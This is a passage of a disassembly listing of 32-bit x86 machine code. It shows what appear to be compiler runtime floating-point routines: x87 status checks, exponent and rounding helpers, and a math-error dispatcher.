  409328:	75 ed                	jne    0x409317
  40932a:	0a ed                	or     %ch,%ch
  40932c:	74 e9                	je     0x409317
  40932e:	d9 e0                	fchs
  409330:	eb e5                	jmp    0x409317
  409332:	dd d8                	fstp   %st(0)
  409334:	e9 0d 02 00 00       	jmp    0x409546
  409339:	dd d8                	fstp   %st(0)
  40933b:	e9 b5 02 00 00       	jmp    0x4095f5
  409340:	58                   	pop    %eax
  409341:	d9 e4                	ftst
  409343:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
  40934a:	9b                   	fwait
  40934b:	f6 85 61 ff ff ff 01 	testb  $0x1,-0x9f(%ebp)
  409352:	75 0f                	jne    0x409363
  409354:	dd d8                	fstp   %st(0)
  409356:	db 2d f0 fe 40 00    	fldt   0x40fef0
  40935c:	0a ed                	or     %ch,%ch
  40935e:	74 02                	je     0x409362
  409360:	d9 e0                	fchs
  409362:	c3                   	ret
  409363:	c6 85 70 ff ff ff 04 	movb   $0x4,-0x90(%ebp)
  40936a:	e9 d7 01 00 00       	jmp    0x409546
  40936f:	dd d8                	fstp   %st(0)
  409371:	dd d8                	fstp   %st(0)
  409373:	db 2d f0 fe 40 00    	fldt   0x40fef0
  409379:	c6 85 70 ff ff ff 03 	movb   $0x3,-0x90(%ebp)
  409380:	c3                   	ret
  409381:	0a c9                	or     %cl,%cl
  409383:	75 af                	jne    0x409334
  409385:	dd d8                	fstp   %st(0)
  409387:	db 2d f0 fe 40 00    	fldt   0x40fef0
  40938d:	c3                   	ret
  40938e:	d9 c0                	fld    %st(0)
  409390:	d9 e1                	fabs
  409392:	db 2d 0e ff 40 00    	fldt   0x40ff0e
  409398:	de d9                	fcompp
  40939a:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
  4093a1:	9b                   	fwait
  4093a2:	f6 85 61 ff ff ff 41 	testb  $0x41,-0x9f(%ebp)
  4093a9:	75 95                	jne    0x409340
  4093ab:	d9 c0                	fld    %st(0)
  4093ad:	d9 fc                	frndint
  4093af:	d9 e4                	ftst
  4093b1:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
  4093b8:	9b                   	fwait
  4093b9:	8a 95 61 ff ff ff    	mov    -0x9f(%ebp),%dl
  4093bf:	d9 c9                	fxch   %st(1)
  4093c1:	d8 e1                	fsub   %st(1),%st
  4093c3:	d9 e4                	ftst
  4093c5:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
  4093cc:	d9 e1                	fabs
  4093ce:	d9 f0                	f2xm1
  4093d0:	c3                   	ret
  4093d1:	d9 c0                	fld    %st(0)
  4093d3:	d9 fc                	frndint
  4093d5:	d8 d9                	fcomp  %st(1)
  4093d7:	9b df e0             	fstsw  %ax
  4093da:	9e                   	sahf
  4093db:	75 1a                	jne    0x4093f7
  4093dd:	d9 c0                	fld    %st(0)
  4093df:	dc 0d 22 ff 40 00    	fmull  0x40ff22
  4093e5:	d9 c0                	fld    %st(0)
  4093e7:	d9 fc                	frndint
  4093e9:	de d9                	fcompp
  4093eb:	9b df e0             	fstsw  %ax
  4093ee:	9e                   	sahf
  4093ef:	74 0d                	je     0x4093fe
  4093f1:	b8 01 00 00 00       	mov    $0x1,%eax
  4093f6:	c3                   	ret
  4093f7:	b8 00 00 00 00       	mov    $0x0,%eax
  4093fc:	eb f8                	jmp    0x4093f6
  4093fe:	b8 02 00 00 00       	mov    $0x2,%eax
  409403:	eb f1                	jmp    0x4093f6
  409405:	56                   	push   %esi
  409406:	83 ec 74             	sub    $0x74,%esp
  409409:	8b f4                	mov    %esp,%esi
  40940b:	56                   	push   %esi
  40940c:	83 ec 08             	sub    $0x8,%esp
  40940f:	dd 1c 24             	fstpl  (%esp)
  409412:	83 ec 08             	sub    $0x8,%esp
  409415:	dd 1c 24             	fstpl  (%esp)
  409418:	9b dd 76 08          	fsave  0x8(%esi)
  40941c:	e8 73 09 00 00       	call   0x409d94
  409421:	83 c4 14             	add    $0x14,%esp
  409424:	dd 66 08             	frstor 0x8(%esi)
  409427:	dd 06                	fldl   (%esi)
  409429:	83 c4 74             	add    $0x74,%esp
  40942c:	5e                   	pop    %esi
  40942d:	85 c0                	test   %eax,%eax
  40942f:	74 05                	je     0x409436
  409431:	e9 d0 01 00 00       	jmp    0x409606
  409436:	c3                   	ret
  409437:	cc                   	int3
  409438:	cc                   	int3
  409439:	cc                   	int3
  40943a:	cc                   	int3
  40943b:	cc                   	int3
  40943c:	cc                   	int3
  40943d:	cc                   	int3
  40943e:	cc                   	int3
  40943f:	cc                   	int3
  409440:	80 7a 0e 05          	cmpb   $0x5,0xe(%edx)
  409444:	75 11                	jne    0x409457
  409446:	66 8b 9d 5c ff ff ff 	mov    -0xa4(%ebp),%bx
  40944d:	80 cf 02             	or     $0x2,%bh
  409450:	80 e7 fe             	and    $0xfe,%bh
  409453:	b3 3f                	mov    $0x3f,%bl
  409455:	eb 04                	jmp    0x40945b
  409457:	66 bb 3f 13          	mov    $0x133f,%bx
  40945b:	66 89 9d 5e ff ff ff 	mov    %bx,-0xa2(%ebp)
  409462:	d9 ad 5e ff ff ff    	fldcw  -0xa2(%ebp)
  409468:	bb 7e ff 40 00       	mov    $0x40ff7e,%ebx
  40946d:	d9 e5                	fxam
  40946f:	89 95 6c ff ff ff    	mov    %edx,-0x94(%ebp)
  409475:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
  40947c:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
  409483:	9b                   	fwait
  409484:	8a 8d 61 ff ff ff    	mov    -0x9f(%ebp),%cl
  40948a:	d0 e1                	shl    $1,%cl
  40948c:	d0 f9                	sar    $1,%cl
  40948e:	d0 c1                	rol    $1,%cl
  409490:	8a c1                	mov    %cl,%al
  409492:	24 0f                	and    $0xf,%al
  409494:	d7                   	xlat   %ds:(%ebx)
  409495:	0f be c0             	movsbl %al,%eax
  409498:	81 e1 04 04 00 00    	and    $0x404,%ecx
  40949e:	8b da                	mov    %edx,%ebx
  4094a0:	03 d8                	add    %eax,%ebx
  4094a2:	83 c3 10             	add    $0x10,%ebx
  4094a5:	ff 23                	jmp    *(%ebx)
  4094a7:	80 7a 0e 05          	cmpb   $0x5,0xe(%edx)
  4094ab:	75 11                	jne    0x4094be
  4094ad:	66 8b 9d 5c ff ff ff 	mov    -0xa4(%ebp),%bx
  4094b4:	80 cf 02             	or     $0x2,%bh
  4094b7:	80 e7 fe             	and    $0xfe,%bh
  4094ba:	b3 3f                	mov    $0x3f,%bl
  4094bc:	eb 04                	jmp    0x4094c2
  4094be:	66 bb 3f 13          	mov    $0x133f,%bx
  4094c2:	66 89 9d 5e ff ff ff 	mov    %bx,-0xa2(%ebp)
  4094c9:	d9 ad 5e ff ff ff    	fldcw  -0xa2(%ebp)
  4094cf:	bb 7e ff 40 00       	mov    $0x40ff7e,%ebx
  4094d4:	d9 e5                	fxam
  4094d6:	89 95 6c ff ff ff    	mov    %edx,-0x94(%ebp)
  4094dc:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
  4094e3:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
  4094ea:	d9 c9                	fxch   %st(1)
  4094ec:	8a 8d 61 ff ff ff    	mov    -0x9f(%ebp),%cl
  4094f2:	d9 e5                	fxam
  4094f4:	9b dd bd 60 ff ff ff 	fstsw  -0xa0(%ebp)
  4094fb:	d9 c9                	fxch   %st(1)
  4094fd:	8a ad 61 ff ff ff    	mov    -0x9f(%ebp),%ch
  409503:	d0 e5                	shl    $1,%ch
  409505:	d0 fd                	sar    $1,%ch
  409507:	d0 c5                	rol    $1,%ch
  409509:	8a c5                	mov    %ch,%al
  40950b:	24 0f                	and    $0xf,%al
  40950d:	d7                   	xlat   %ds:(%ebx)
  40950e:	8a e0                	mov    %al,%ah
  409510:	d0 e1                	shl    $1,%cl
  409512:	d0 f9                	sar    $1,%cl
  409514:	d0 c1                	rol    $1,%cl
  409516:	8a c1                	mov    %cl,%al
  409518:	24 0f                	and    $0xf,%al
  40951a:	d7                   	xlat   %ds:(%ebx)
  40951b:	d0 e4                	shl    $1,%ah
  40951d:	d0 e4                	shl    $1,%ah
  40951f:	0a c4                	or     %ah,%al
  409521:	0f be c0             	movsbl %al,%eax
  409524:	81 e1 04 04 00 00    	and    $0x404,%ecx
  40952a:	8b da                	mov    %edx,%ebx
  40952c:	03 d8                	add    %eax,%ebx
  40952e:	83 c3 10             	add    $0x10,%ebx
  409531:	ff 23                	jmp    *(%ebx)
  409533:	e8 ce 00 00 00       	call   0x409606
  409538:	d9 c9                	fxch   %st(1)
  40953a:	dd d8                	fstp   %st(0)
  40953c:	c3                   	ret
  40953d:	e8 c4 00 00 00       	call   0x409606
  409542:	eb f6                	jmp    0x40953a
  409544:	dd d8                	fstp   %st(0)
  409546:	dd d8                	fstp   %st(0)
  409548:	d9 ee                	fldz
  40954a:	c3                   	ret
  40954b:	dd d8                	fstp   %st(0)
  40954d:	dd d8                	fstp   %st(0)
  40954f:	d9 ee                	fldz
  409551:	84 ed                	test   %ch,%ch
  409553:	74 02                	je     0x409557
  409555:	d9 e0                	fchs
  409557:	c3                   	ret
  409558:	dd d8                	fstp   %st(0)
  40955a:	dd d8                	fstp   %st(0)
  40955c:	d9 e8                	fld1
  40955e:	c3                   	ret
  40955f:	db bd 62 ff ff ff    	fstpt  -0x9e(%ebp)
  409565:	db ad 62 ff ff ff    	fldt   -0x9e(%ebp)
  40956b:	f6 85 69 ff ff ff 40 	testb  $0x40,-0x97(%ebp)
  409572:	74 08                	je     0x40957c
  409574:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
  40957b:	c3                   	ret
  40957c:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
  409583:	dc 05 6e ff 40 00    	faddl  0x40ff6e
  409589:	c3                   	ret
  40958a:	d9 c9                	fxch   %st(1)
  40958c:	db bd 62 ff ff ff    	fstpt  -0x9e(%ebp)
  409592:	db ad 62 ff ff ff    	fldt   -0x9e(%ebp)
  409598:	f6 85 69 ff ff ff 40 	testb  $0x40,-0x97(%ebp)
  40959f:	74 09                	je     0x4095aa
  4095a1:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
  4095a8:	eb 07                	jmp    0x4095b1
  4095aa:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
  4095b1:	de c1                	faddp  %st,%st(1)
  4095b3:	c3                   	ret
  4095b4:	db bd 62 ff ff ff    	fstpt  -0x9e(%ebp)
  4095ba:	db ad 62 ff ff ff    	fldt   -0x9e(%ebp)
  4095c0:	f6 85 69 ff ff ff 40 	testb  $0x40,-0x97(%ebp)
  4095c7:	74 20                	je     0x4095e9
  4095c9:	d9 c9                	fxch   %st(1)
  4095cb:	db bd 62 ff ff ff    	fstpt  -0x9e(%ebp)
  4095d1:	db ad 62 ff ff ff    	fldt   -0x9e(%ebp)
  4095d7:	f6 85 69 ff ff ff 40 	testb  $0x40,-0x97(%ebp)
  4095de:	74 09                	je     0x4095e9
  4095e0:	c6 85 70 ff ff ff 00 	movb   $0x0,-0x90(%ebp)
  4095e7:	eb 07                	jmp    0x4095f0
  4095e9:	c6 85 70 ff ff ff 01 	movb   $0x1,-0x90(%ebp)
  4095f0:	de c1                	faddp  %st,%st(1)
  4095f2:	c3                   	ret
  4095f3:	dd d8                	fstp   %st(0)
  4095f5:	dd d8                	fstp   %st(0)
  4095f7:	db 2d 50 ff 40 00    	fldt   0x40ff50
  4095fd:	80 bd 70 ff ff ff 00 	cmpb   $0x0,-0x90(%ebp)
  409604:	7f 07                	jg     0x40960d
  409606:	c6 85 70 ff ff ff 01 	movb   $0x1,-0x90(%ebp)
  40960d:	0a c9                	or     %cl,%cl
  40960f:	c3                   	ret
  409610:	dd d8                	fstp   %st(0)
  409612:	dd d8                	fstp   %st(0)
  409614:	db 2d 64 ff 40 00    	fldt   0x40ff64
  40961a:	0a ed                	or     %ch,%ch
  40961c:	74 02                	je     0x409620
  40961e:	d9 e0                	fchs
  409620:	0a c9                	or     %cl,%cl
  409622:	74 08                	je     0x40962c
  409624:	dd 05 76 ff 40 00    	fldl   0x40ff76
  40962a:	de c9                	fmulp  %st,%st(1)
  40962c:	c3                   	ret
  40962d:	0a c9                	or     %cl,%cl
  40962f:	74 02                	je     0x409633
  409631:	d9 e0                	fchs
  409633:	c3                   	ret
  409634:	cc                   	int3
  409635:	cc                   	int3
  409636:	cc                   	int3
  409637:	cc                   	int3
  409638:	cc                   	int3
  409639:	cc                   	int3
  40963a:	cc                   	int3
  40963b:	cc                   	int3
  40963c:	cc                   	int3
  40963d:	cc                   	int3
  40963e:	cc                   	int3
  40963f:	cc                   	int3
  409640:	d9 c0                	fld    %st(0)
  409642:	d9 fc                	frndint
  409644:	dc e1                	fsub   %st,%st(1)
  409646:	d9 c9                	fxch   %st(1)
  409648:	d9 e0                	fchs
  40964a:	d9 f0                	f2xm1
  40964c:	d9 e8                	fld1
  40964e:	de c1                	faddp  %st,%st(1)
  409650:	d9 fd                	fscale
  409652:	dd d9                	fstp   %st(1)
  409654:	c3                   	ret
  409655:	8b 54 24 04          	mov    0x4(%esp),%edx
  409659:	81 e2 00 03 00 00    	and    $0x300,%edx
  40965f:	83 ca 7f             	or     $0x7f,%edx
  409662:	66 89 54 24 06       	mov    %dx,0x6(%esp)
  409667:	d9 6c 24 06          	fldcw  0x6(%esp)
  40966b:	c3                   	ret
  40966c:	a9 00 00 08 00       	test   $0x80000,%eax
  409671:	74 06                	je     0x409679
  409673:	b8 00 00 00 00       	mov    $0x0,%eax
  409678:	c3                   	ret
  409679:	dc 05 90 ff 40 00    	faddl  0x40ff90
  40967f:	b8 00 00 00 00       	mov    $0x0,%eax
  409684:	c3                   	ret
  409685:	8b 42 04             	mov    0x4(%edx),%eax
  409688:	25 00 00 f0 7f       	and    $0x7ff00000,%eax
  40968d:	3d 00 00 f0 7f       	cmp    $0x7ff00000,%eax
  409692:	74 03                	je     0x409697
  409694:	dd 02                	fldl   (%edx)
  409696:	c3                   	ret
  409697:	8b 42 04             	mov    0x4(%edx),%eax
  40969a:	83 ec 0a             	sub    $0xa,%esp
  40969d:	0d 00 00 ff 7f       	or     $0x7fff0000,%eax
  4096a2:	89 44 24 06          	mov    %eax,0x6(%esp)
  4096a6:	8b 42 04             	mov    0x4(%edx),%eax
  4096a9:	8b 0a                	mov    (%edx),%ecx
  4096ab:	0f a4 c8 0b          	shld   $0xb,%ecx,%eax
  4096af:	c1 e1 0b             	shl    $0xb,%ecx
  4096b2:	89 44 24 04          	mov    %eax,0x4(%esp)
  4096b6:	89 0c 24             	mov    %ecx,(%esp)
  4096b9:	db 2c 24             	fldt   (%esp)
  4096bc:	83 c4 0a             	add    $0xa,%esp
  4096bf:	a9 00 00 00 00       	test   $0x0,%eax
  4096c4:	8b 42 04             	mov    0x4(%edx),%eax
  4096c7:	c3                   	ret
  4096c8:	8b 44 24 08          	mov    0x8(%esp),%eax
  4096cc:	25 00 00 f0 7f       	and    $0x7ff00000,%eax
  4096d1:	3d 00 00 f0 7f       	cmp    $0x7ff00000,%eax
  4096d6:	74 01                	je     0x4096d9
  4096d8:	c3                   	ret
  4096d9:	8b 44 24 08          	mov    0x8(%esp),%eax
  4096dd:	c3                   	ret
  4096de:	66 81 3c 24 7f 02    	cmpw   $0x27f,(%esp)
  4096e4:	74 03                	je     0x4096e9
  4096e6:	d9 2c 24             	fldcw  (%esp)
  4096e9:	5a                   	pop    %edx
  4096ea:	c3                   	ret
  4096eb:	66 8b 04 24          	mov    (%esp),%ax
  4096ef:	66 3d 7f 02          	cmp    $0x27f,%ax
  4096f3:	74 1e                	je     0x409713
  4096f5:	66 83 e0 20          	and    $0x20,%ax
  4096f9:	74 15                	je     0x409710
  4096fb:	9b df e0             	fstsw  %ax
  4096fe:	66 83 e0 20          	and    $0x20,%ax
  409702:	74 0c                	je     0x409710
  409704:	b8 08 00 00 00       	mov    $0x8,%eax
  409709:	e8 d9 00 00 00       	call   0x4097e7
  40970e:	5a                   	pop    %edx
  40970f:	c3                   	ret
  409710:	d9 2c 24             	fldcw  (%esp)
  409713:	5a                   	pop    %edx
  409714:	c3                   	ret
  409715:	83 ec 08             	sub    $0x8,%esp
  409718:	dd 14 24             	fstl   (%esp)
  40971b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40971f:	83 c4 08             	add    $0x8,%esp
  409722:	25 00 00 f0 7f       	and    $0x7ff00000,%eax
  409727:	eb 14                	jmp    0x40973d
  409729:	83 ec 08             	sub    $0x8,%esp
  40972c:	dd 14 24             	fstl   (%esp)
  40972f:	8b 44 24 04          	mov    0x4(%esp),%eax
  409733:	83 c4 08             	add    $0x8,%esp
  409736:	25 00 00 f0 7f       	and    $0x7ff00000,%eax
  40973b:	74 3d                	je     0x40977a
  40973d:	3d 00 00 f0 7f       	cmp    $0x7ff00000,%eax
  409742:	74 5f                	je     0x4097a3
  409744:	66 8b 04 24          	mov    (%esp),%ax
  409748:	66 3d 7f 02          	cmp    $0x27f,%ax
  40974c:	74 2a                	je     0x409778
  40974e:	66 83 e0 20          	and    $0x20,%ax
  409752:	75 21                	jne    0x409775
  409754:	9b df e0             	fstsw  %ax
  409757:	66 83 e0 20          	and    $0x20,%ax
  40975b:	74 18                	je     0x409775
  40975d:	b8 08 00 00 00       	mov    $0x8,%eax
  409762:	83 fa 1d             	cmp    $0x1d,%edx
  409765:	74 07                	je     0x40976e
  409767:	e8 7b 00 00 00       	call   0x4097e7
  40976c:	5a                   	pop    %edx
  40976d:	c3                   	ret
  40976e:	e8 5d 00 00 00       	call   0x4097d0
  409773:	5a                   	pop    %edx
  409774:	c3                   	ret
  409775:	d9 2c 24             	fldcw  (%esp)
  409778:	5a                   	pop    %edx
  409779:	c3                   	ret
  40977a:	dd 05 bc ff 40 00    	fldl   0x40ffbc
  409780:	d9 c9                	fxch   %st(1)
  409782:	d9 fd                	fscale
  409784:	dd d9                	fstp   %st(1)
  409786:	d9 c0                	fld    %st(0)
  409788:	d9 e1                	fabs
  40978a:	dc 1d ac ff 40 00    	fcompl 0x40ffac
  409790:	9b df e0             	fstsw  %ax
  409793:	9e                   	sahf
  409794:	b8 04 00 00 00       	mov    $0x4,%eax
  409799:	73 c7                	jae    0x409762
  40979b:	dc 0d cc ff 40 00    	fmull  0x40ffcc
  4097a1:	eb bf                	jmp    0x409762
  4097a3:	dd 05 b4 ff 40 00    	fldl   0x40ffb4
  4097a9:	d9 c9                	fxch   %st(1)
  4097ab:	d9 fd                	fscale
  4097ad:	dd d9                	fstp   %st(1)
  4097af:	d9 c0                	fld    %st(0)
  4097b1:	d9 e1                	fabs
  4097b3:	dc 1d a4 ff 40 00    	fcompl 0x40ffa4
  4097b9:	9b df e0             	fstsw  %ax
  4097bc:	9e                   	sahf
  4097bd:	b8 03 00 00 00       	mov    $0x3,%eax
  4097c2:	76 9e                	jbe    0x409762
  4097c4:	dc 0d c4 ff 40 00    	fmull  0x40ffc4
  4097ca:	eb 96                	jmp    0x409762
  4097cc:	cc                   	int3
  4097cd:	cc                   	int3
  4097ce:	cc                   	int3
  4097cf:	cc                   	int3
  4097d0:	55                   	push   %ebp
  4097d1:	8b ec                	mov    %esp,%ebp
  4097d3:	83 c4 e0             	add    $0xffffffe0,%esp
  4097d6:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4097d9:	8b 45 18             	mov    0x18(%ebp),%eax
  4097dc:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4097df:	8b 45 1c             	mov    0x1c(%ebp),%eax
  4097e2:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4097e5:	eb 09                	jmp    0x4097f0
  4097e7:	55                   	push   %ebp
  4097e8:	8b ec                	mov    %esp,%ebp
  4097ea:	83 c4 e0             	add    $0xffffffe0,%esp
  4097ed:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4097f0:	dd 5d f8             	fstpl  -0x8(%ebp)
  4097f3:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  4097f6:	8b 45 10             	mov    0x10(%ebp),%eax
  4097f9:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4097fc:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4097ff:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  409802:	8d 45 08             	lea    0x8(%ebp),%eax
  409805:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  409808:	50                   	push   %eax
  409809:	51                   	push   %ecx
  40980a:	52                   	push   %edx
  40980b:	e8 af 06 00 00       	call   0x409ebf
  409810:	83 c4 0c             	add    $0xc,%esp
  409813:	dd 45 f8             	fldl   -0x8(%ebp)
  409816:	66 81 7d 08 7f 02    	cmpw   $0x27f,0x8(%ebp)
  40981c:	74 03                	je     0x409821
  40981e:	d9 6d 08             	fldcw  0x8(%ebp)
  409821:	c9                   	leave
  409822:	c3                   	ret
  409823:	8b ff                	mov    %edi,%edi
  409825:	55                   	push   %ebp
  409826:	8b ec                	mov    %esp,%ebp
  409828:	83 ec 24             	sub    $0x24,%esp
  40982b:	a1 04 30 41 00       	mov    0x413004,%eax
  409830:	33 c5                	xor    %ebp,%eax
  409832:	89 45 fc             	mov    %eax,-0x4(%ebp)
  409835:	83 3d 8c 42 41 00 00 	cmpl   $0x0,0x41428c
  40983c:	56                   	push   %esi
  40983d:	57                   	push   %edi
  40983e:	74 10                	je     0x409850
  409840:	ff 35 a0 42 41 00    	push   0x4142a0
  409846:	ff 15 48 c0 40 00    	call   *0x40c048
  40984c:	8b f8                	mov    %eax,%edi
  40984e:	eb 05                	jmp    0x409855
  409850:	bf 3c 2e 40 00       	mov    $0x402e3c,%edi
  409855:	8b 45 14             	mov    0x14(%ebp),%eax
  409858:	83 f8 1a             	cmp    $0x1a,%eax
  40985b:	0f 8f 21 01 00 00    	jg     0x409982
  409861:	0f 84 0f 01 00 00    	je     0x409976
  409867:	83 f8 0e             	cmp    $0xe,%eax
  40986a:	0f 8f a7 00 00 00    	jg     0x409917
  409870:	0f 84 8e 00 00 00    	je     0x409904
  409876:	6a 02                	push   $0x2
  409878:	59                   	pop    %ecx
  409879:	2b c1                	sub    %ecx,%eax
  40987b:	74 78                	je     0x4098f5
  40987d:	83 e8 01             	sub    $0x1,%eax
  409880:	74 6a                	je     0x4098ec
  409882:	83 e8 05             	sub    $0x5,%eax
  409885:	74 56                	je     0x4098dd
  409887:	83 e8 01             	sub    $0x1,%eax
  40988a:	0f 85 9b 01 00 00    	jne    0x409a2b
  409890:	c7 45 e0 d8 ff 40 00 	movl   $0x40ffd8,-0x20(%ebp)
  409897:	8b 45 08             	mov    0x8(%ebp),%eax
  40989a:	8b cf                	mov    %edi,%ecx
  40989c:	8b 75 10             	mov    0x10(%ebp),%esi
  40989f:	c7 45 dc 01 00 00 00 	movl   $0x1,-0x24(%ebp)
  4098a6:	dd 00                	fldl   (%eax)
  4098a8:	8b 45 0c             	mov    0xc(%ebp),%eax
  4098ab:	dd 5d e4             	fstpl  -0x1c(%ebp)
  4098ae:	dd 00                	fldl   (%eax)
  4098b0:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4098b3:	dd 5d ec             	fstpl  -0x14(%ebp)
  4098b6:	dd 06                	fldl   (%esi)
  4098b8:	50                   	push   %eax
  4098b9:	dd 5d f4             	fstpl  -0xc(%ebp)
  4098bc:	ff 15 60 c1 40 00    	call   *0x40c160
  4098c2:	ff d7                	call   *%edi
  4098c4:	59                   	pop    %ecx
  4098c5:	85 c0                	test   %eax,%eax
  4098c7:	0f 85 59 01 00 00    	jne    0x409a26
  4098cd:	e8 69 af ff ff       	call   0x40483b
  4098d2:	c7 00 21 00 00 00    	movl   $0x21,(%eax)
  4098d8:	e9 49 01 00 00       	jmp    0x409a26
  4098dd:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  4098e0:	c7 45 e0 d8 ff 40 00 	movl   $0x40ffd8,-0x20(%ebp)
  4098e7:	e9 04 01 00 00       	jmp    0x4099f0
  4098ec:	c7 45 e0 d4 ff 40 00 	movl   $0x40ffd4,-0x20(%ebp)
  4098f3:	eb a2                	jmp    0x409897
  4098f5:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  4098f8:	c7 45 e0 d4 ff 40 00 	movl   $0x40ffd4,-0x20(%ebp)
  4098ff:	e9 ec 00 00 00       	jmp    0x4099f0
  409904:	c7 45 dc 03 00 00 00 	movl   $0x3,-0x24(%ebp)
  40990b:	c7 45 e0 e0 ff 40 00 	movl   $0x40ffe0,-0x20(%ebp)
  409912:	e9 d9 00 00 00       	jmp    0x4099f0
  409917:	83 e8 0f             	sub    $0xf,%eax
  40991a:	74 51                	je     0x40996d
  40991c:	83 e8 09             	sub    $0x9,%eax
  40991f:	74 43                	je     0x409964
  409921:	83 e8 01             	sub    $0x1,%eax
  409924:	0f 85 01 01 00 00    	jne    0x409a2b
  40992a:	c7 45 e0 e4 ff 40 00 	movl   $0x40ffe4,-0x20(%ebp)
  409931:	8b 45 08             	mov    0x8(%ebp),%eax
  409934:	8b cf                	mov    %edi,%ecx
  409936:	8b 75 10             	mov    0x10(%ebp),%esi
  409939:	c7 45 dc 04 00 00 00 	movl   $0x4,-0x24(%ebp)
  409940:	dd 00                	fldl   (%eax)
  409942:	8b 45 0c             	mov    0xc(%ebp),%eax
  409945:	dd 5d e4             	fstpl  -0x1c(%ebp)
  409948:	dd 00                	fldl   (%eax)
  40994a:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40994d:	dd 5d ec             	fstpl  -0x14(%ebp)
  409950:	dd 06                	fldl   (%esi)
  409952:	50                   	push   %eax
  409953:	dd 5d f4             	fstpl  -0xc(%ebp)
  409956:	ff 15 60 c1 40 00    	call   *0x40c160
  40995c:	ff d7                	call   *%edi
  40995e:	59                   	pop    %ecx
  40995f:	e9 c2 00 00 00       	jmp    0x409a26
  409964:	c7 45 dc 03 00 00 00 	movl   $0x3,-0x24(%ebp)
  40996b:	eb 7c                	jmp    0x4099e9
  40996d:	c7 45 e0 e0 ff 40 00 	movl   $0x40ffe0,-0x20(%ebp)
  409974:	eb bb                	jmp    0x409931
  409976:	d9 e8                	fld1
  409978:	8b 45 10             	mov    0x10(%ebp),%eax
  40997b:	dd 18                	fstpl  (%eax)
  40997d:	e9 a9 00 00 00       	jmp    0x409a2b
  409982:	83 e8 1b             	sub    $0x1b,%eax
  409985:	74 5b                	je     0x4099e2
  409987:	83 e8 01             	sub    $0x1,%eax
  40998a:	74 4a                	je     0x4099d6
  40998c:	83 e8 15             	sub    $0x15,%eax
  40998f:	74 39                	je     0x4099ca
  409991:	83 e8 09             	sub    $0x9,%eax
  409994:	74 28                	je     0x4099be
  409996:	83 e8 03             	sub    $0x3,%eax
  409999:	74 17                	je     0x4099b2
  40999b:	2d ab 03 00 00       	sub    $0x3ab,%eax
  4099a0:	74 09                	je     0x4099ab
  4099a2:	83 e8 01             	sub    $0x1,%eax
  4099a5:	0f 85 80 00 00 00    	jne    0x409a2b
  4099ab:	8b 45 08             	mov    0x8(%ebp),%eax
  4099ae:	dd 00                	fldl   (%eax)
  4099b0:	eb c6                	jmp    0x409978
  4099b2:	c7 45 e0 e8 ff 40 00 	movl   $0x40ffe8,-0x20(%ebp)
  4099b9:	e9 d9 fe ff ff       	jmp    0x409897
  4099be:	c7 45 e0 f0 ff 40 00 	movl   $0x40fff0,-0x20(%ebp)
  4099c5:	e9 cd fe ff ff       	jmp    0x409897
  4099ca:	c7 45 e0 f8 ff 40 00 	movl   $0x40fff8,-0x20(%ebp)
  4099d1:	e9 c1 fe ff ff       	jmp    0x409897
  4099d6:	c7 45 e0 e4 ff 40 00 	movl   $0x40ffe4,-0x20(%ebp)
  4099dd:	e9 b5 fe ff ff       	jmp    0x409897
  4099e2:	c7 45 dc 02 00 00 00 	movl   $0x2,-0x24(%ebp)
  4099e9:	c7 45 e0 e4 ff 40 00 	movl   $0x40ffe4,-0x20(%ebp)
  4099f0:	8b 45 08             	mov    0x8(%ebp),%eax
  4099f3:	8b cf                	mov    %edi,%ecx
  4099f5:	8b 75 10             	mov    0x10(%ebp),%esi
  4099f8:	dd 00                	fldl   (%eax)
  4099fa:	8b 45 0c             	mov    0xc(%ebp),%eax
  4099fd:	dd 5d e4             	fstpl  -0x1c(%ebp)
  409a00:	dd 00                	fldl   (%eax)
  409a02:	8d 45 dc             	lea    -0x24(%ebp),%eax
  409a05:	dd 5d ec             	fstpl  -0x14(%ebp)
  409a08:	dd 06                	fldl   (%esi)
  409a0a:	50                   	push   %eax
  409a0b:	dd 5d f4             	fstpl  -0xc(%ebp)
  409a0e:	ff 15 60 c1 40 00    	call   *0x40c160
  409a14:	ff d7                	call   *%edi
  409a16:	59                   	pop    %ecx
  409a17:	85 c0                	test   %eax,%eax
  409a19:	75 0b                	jne    0x409a26
  409a1b:	e8 1b ae ff ff       	call   0x40483b
  409a20:	c7 00 22 00 00 00    	movl   $0x22,(%eax)
  409a26:	dd 45 f4             	fldl   -0xc(%ebp)
  409a29:	dd 1e                	fstpl  (%esi)
  409a2b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  409a2e:	5f                   	pop    %edi
  409a2f:	33 cd                	xor    %ebp,%ecx
  409a31:	5e                   	pop    %esi
  409a32:	e8 91 7d ff ff       	call   0x4017c8
  409a37:	8b e5                	mov    %ebp,%esp
  409a39:	5d                   	pop    %ebp
  409a3a:	c3                   	ret
  409a3b:	8b ff                	mov    %edi,%edi
  409a3d:	55                   	push   %ebp
  409a3e:	8b ec                	mov    %esp,%ebp
  409a40:	51                   	push   %ecx
  409a41:	51                   	push   %ecx
  409a42:	53                   	push   %ebx
  409a43:	56                   	push   %esi
